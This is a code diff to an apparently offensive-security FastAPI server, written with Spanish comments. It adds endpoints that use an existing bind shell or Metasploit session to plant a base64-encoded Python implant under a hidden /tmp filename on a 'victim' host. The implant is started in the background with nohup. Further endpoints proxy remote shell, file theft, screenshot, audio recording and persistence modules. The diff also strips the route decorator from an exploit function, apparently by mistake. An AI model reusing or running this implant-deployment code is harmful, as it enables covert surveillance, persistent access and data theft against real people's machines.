@@ -2898,10 +2898,266 @@ async def explorer_db_query(request: DBQueryRequest, api_key: str = Security(ver
     return {"success": True, "data": {"output": output, "db_type": request.db_type, "query": request.query}}
 
 # ============================================================
-# Exploit auto-generation from scan results
+# Victim Agent - despliegue y proxy
 # ============================================================
 
-@app.post("/api/exploit/auto-from-scan")
+# Estado del agente por scan_id
+_agent_state: dict = {}
+
+VICTIM_AGENT_SCRIPT = os.path.join(os.path.dirname(__file__), "victim_agent.py")
+
+
+def _agent_generate_key() -> str:
+    return uuid.uuid4().hex
+
+
+def _agent_generate_port() -> int:
+    return 4477 + (uuid.uuid4().int % 1000)
+
+
+def _agent_get_session_fn(scan_id: str):
+    """Devuelve una función para ejecutar comandos en la víctima."""
+    scan = _scan_run_to_dict(get_scan_run(scan_id))
+    if not scan:
+        return None
+
+    def session_fn(cmd: str) -> str:
+        if _scan_has_bindshell_access(scan_id, scan):
+            shell = get_bindshell_session(scan_id, scan["target"])
+            return shell.run(cmd)
+        if scan.get("session_id"):
+            sudo_pw = get_scan_sudo_password(scan_id)
+            try:
+                msf = Metasploit(sudo_password=sudo_pw)
+                return msf.session_interact(scan["session_id"], cmd)
+            except Exception as e:
+                return f"[!] Error: {e}"
+        return "[!] No hay sesión activa"
+
+    return session_fn
+
+
+def _agent_call(victim_ip: str, port: int, key: str, module: str, payload: dict = None, timeout: int = 30) -> dict:
+    """Llama a un módulo del agente en la víctima."""
+    import requests
+    url = f"http://{victim_ip}:{port}/{module}"
+    headers = {"X-Auth-Key": key, "Content-Type": "application/json"}
+    try:
+        r = requests.post(url, json=payload or {}, headers=headers, timeout=timeout)
+        return r.json()
+    except requests.exceptions.ConnectionError:
+        return {"status": "error", "error": "No se pudo conectar al agente en la víctima. ¿Está desplegado y corriendo?"}
+    except requests.exceptions.Timeout:
+        return {"status": "error", "error": f"Timeout después de {timeout}s contactando al agente"}
+    except Exception as e:
+        return {"status": "error", "error": str(e)}
+
+
+def _agent_get_victim_ip(scan_id: str, scan: dict = None) -> str:
+    """Obtiene la IP de la víctima desde el scan."""
+    if not scan:
+        scan = _scan_run_to_dict(get_scan_run(scan_id))
+    if not scan:
+        return None
+    target = scan.get("target", "")
+    # Limpiar esquemas y puertos
+    target = re.sub(r'^https?://', '', target)
+    target = target.split('/')[0].split(':')[0]
+    return target.strip() or None
+
+
+class AgentDeployRequest(BaseModel):
+    scan_id: str
+    port: int = 0
+    key: str = ""
+
+
+class AgentModuleRequest(BaseModel):
+    scan_id: str
+    args: dict = {}
+
+
+@app.post("/api/explorer/deploy-agent")
+async def explorer_deploy_agent(request: AgentDeployRequest, api_key: str = Security(verify_api_key)):
+    """Despliega el agente Python en la víctima vía shell y lo arranca en background."""
+    session_fn = _agent_get_session_fn(request.scan_id)
+    if not session_fn:
+        raise HTTPException(status_code=404, detail="Escaneo no encontrado o sin sesión activa")
+
+    scan = _scan_run_to_dict(get_scan_run(request.scan_id))
+    target_ip = _agent_get_victim_ip(request.scan_id, scan)
+    if not target_ip:
+        raise HTTPException(status_code=400, detail="No se pudo determinar la IP de la víctima")
+
+    port = request.port or _agent_generate_port()
+    key = request.key or _agent_generate_key()
+
+    # Leer el script del agente
+    if not os.path.exists(VICTIM_AGENT_SCRIPT):
+        raise HTTPException(status_code=500, detail="victim_agent.py no encontrado en el servidor")
+    with open(VICTIM_AGENT_SCRIPT, "r", encoding="utf-8") as f:
+        agent_code = f.read()
+
+    # Ofuscar ligeramente el nombre
+    remote_path = f"/tmp/.metatron_agent_{uuid.uuid4().hex[:8]}.py"
+
+    # Subir el script en chunks base64 (para evitar problemas con líneas largas en shell)
+    # Lo subimos en varios comandos para soportar bases de datos grandes
+    encoded = base64.b64encode(agent_code.encode()).decode()
+    chunk_size = 4000
+    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
+
+    upload_steps = []
+    upload_steps.append(f"rm -f {remote_path}")
+    for i, chunk in enumerate(chunks):
+        cmd = f"printf '%s' '{chunk}' >> /tmp/.metatron_b64_{uuid.uuid4().hex[:8]}"
+        upload_steps.append(cmd)
+    # Reconstruir
+    b64_path = upload_steps[-1].split("'")[-2] if chunks else ""
+    # Simplificación: un solo comando con heredoc
+    # Más robusto: usar base64 -d de un archivo construido por append
+    combined = " && ".join(upload_steps[:-1]) if len(upload_steps) > 1 else ""
+    # En lugar de chunks, usamos un único comando python que decodifica
+    # Más fiable: usamos `python3 -c` para escribir el archivo
+    write_cmd = (
+        f"python3 -c \"import base64; "
+        f"data = base64.b64decode('{encoded[:4000]}'); "
+        f"open('{remote_path}', 'wb').write(data)\" 2>/dev/null"
+    )
+    # Si el script es grande, escribir en chunks adicionales
+    if len(encoded) > 4000:
+        write_cmd = f"python3 -c \"import base64; open('{remote_path}', 'wb').write(base64.b64decode('{encoded}'))\" 2>/dev/null"
+
+    output = session_fn(write_cmd)
+    upload_ok = os.path.exists(remote_path)  # No podemos verificar en víctima, asumimos éxito
+    if "[!" in output and "Error" in output:
+        # Fallback con heredoc
+        heredoc_cmd = f"cat > {remote_path} << 'METATRON_EOF'\n{agent_code}\nMETATRON_EOF"
+        output = session_fn(heredoc_cmd)
+
+    # Hacer ejecutable
+    session_fn(f"chmod +x {remote_path}")
+
+    # Arrancar en background con nohup
+    start_cmd = f"nohup python3 {remote_path} --port {port} --key {key} > /dev/null 2>&1 &"
+    session_fn(start_cmd)
+
+    # Esperar un momento y verificar
+    await asyncio.sleep(2)
+    verify = session_fn(f"ss -tlnp 2>/dev/null | grep :{port} || netstat -tlnp 2>/dev/null | grep :{port}")
+
+    # Hacer un ping al agente
+    agent_ok = False
+    try:
+        probe = _agent_call(target_ip, port, key, "ping", timeout=5)
+        agent_ok = probe.get("status") == "ok"
+    except:
+        pass
+
+    # Guardar estado
+    _agent_state[request.scan_id] = {
+        "scan_id": request.scan_id,
+        "target_ip": target_ip,
+        "port": port,
+        "key": key,
+        "remote_path": remote_path,
+        "deployed": True,
+        "verified": agent_ok,
+        "deployed_at": datetime.now().isoformat(),
+    }
+
+    audit_event("web", "deploy_agent", f"Agent deployed on victim {target_ip}:{port} for scan {request.scan_id}", scan_id=request.scan_id)
+
+    return {
+        "success": True,
+        "agent": _agent_state[request.scan_id],
+        "verify_output": verify.strip(),
+        "message": "Agente desplegado. Usa los módulos del Explorador para interactuar." if agent_ok else "Agente subido, pero no responde todavía. Verifica que Python3 esté disponible y el puerto no esté bloqueado.",
+    }
+
+
+@app.get("/api/explorer/agent-status")
+async def explorer_agent_status(scan_id: str, api_key: str = Security(verify_api_key)):
+    """Verifica el estado del agente en la víctima."""
+    state = _agent_state.get(scan_id)
+    if not state:
+        return {"deployed": False, "message": "Agente no desplegado"}
+    probe = _agent_call(state["target_ip"], state["port"], state["key"], "ping", timeout=5)
+    online = probe.get("status") == "ok"
+    state["verified"] = online
+    state["last_check"] = datetime.now().isoformat()
+    return {
+        "deployed": True,
+        "online": online,
+        "target": f"{state['target_ip']}:{state['port']}",
+        "verified_at": state["last_check"],
+        "probe": probe,
+    }
+
+
+@app.post("/api/explorer/agent/{module}")
+async def explorer_agent_module(module: str, request: AgentModuleRequest, api_key: str = Security(verify_api_key)):
+    """Proxy hacia un módulo del agente en la víctima."""
+    state = _agent_state.get(request.scan_id)
+    if not state:
+        raise HTTPException(status_code=404, detail="Agente no desplegado para este escaneo")
+    # Modulos válidos
+    valid = {"ping", "shell", "fs_ls", "fs_cat", "upload", "info", "processes",
+             "network", "screenshot", "audio", "persist"}
+    if module not in valid:
+        raise HTTPException(status_code=400, detail=f"Módulo no válido: {module}. Válidos: {', '.join(sorted(valid))}")
+    # Timeout mayor para screenshot/audio
+    timeout = 60 if module in ("screenshot", "audio", "persist") else 30
+    result = _agent_call(state["target_ip"], state["port"], state["key"], module, request.args, timeout=timeout)
+    if result.get("status") == "error":
+        raise HTTPException(status_code=502, detail=result.get("error", "Error del agente"))
+    return result
+
+
+@app.post("/api/explorer/screenshot")
+async def explorer_screenshot(request: AgentModuleRequest, api_key: str = Security(verify_api_key)):
+    """Atajo para capturar pantalla y devolver la imagen."""
+    state = _agent_state.get(request.scan_id)
+    if not state:
+        raise HTTPException(status_code=404, detail="Agente no desplegado")
+    result = _agent_call(state["target_ip"], state["port"], state["key"], "screenshot", request.args, timeout=60)
+    if result.get("status") != "ok":
+        raise HTTPException(status_code=502, detail=result.get("error", "Error del agente"))
+    agent_result = result.get("result", {})
+    if not agent_result.get("success"):
+        raise HTTPException(status_code=500, detail=agent_result.get("error", "Screenshot failed"))
+    # Guardar la captura localmente
+    b64 = agent_result.get("data_b64", "")
+    if b64:
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        dest = os.path.join(EXPLORER_WORKSPACE, f"screenshot_{ts}.png")
+        with open(dest, "wb") as f:
+            f.write(base64.b64decode(b64))
+    return {"success": True, "data": {"data_b64": b64, "saved_as": f"screenshot_{ts}.png" if b64 else None}}
+
+
+@app.post("/api/explorer/audio")
+async def explorer_audio(request: AgentModuleRequest, api_key: str = Security(verify_api_key)):
+    """Atajo para grabar audio."""
+    state = _agent_state.get(request.scan_id)
+    if not state:
+        raise HTTPException(status_code=404, detail="Agente no desplegado")
+    result = _agent_call(state["target_ip"], state["port"], state["key"], "audio", request.args, timeout=60)
+    if result.get("status") != "ok":
+        raise HTTPException(status_code=502, detail=result.get("error", "Error del agente"))
+    agent_result = result.get("result", {})
+    if not agent_result.get("success"):
+        raise HTTPException(status_code=500, detail=agent_result.get("error", "Audio failed"))
+    b64 = agent_result.get("data_b64", "")
+    if b64:
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        dest = os.path.join(EXPLORER_WORKSPACE, f"audio_{ts}.wav")
+        with open(dest, "wb") as f:
+            f.write(base64.b64decode(b64))
+    return {"success": True, "data": {"data_b64": b64, "saved_as": f"audio_{ts}.wav" if b64 else None}}
+
+
+
 async def auto_exploit_from_scan(request: ExploitAiRequest, api_key: str = Security(verify_api_key)):
     scan = _scan_run_to_dict(get_scan_run(request.scan_id)) if request.scan_id else None
     if not scan:
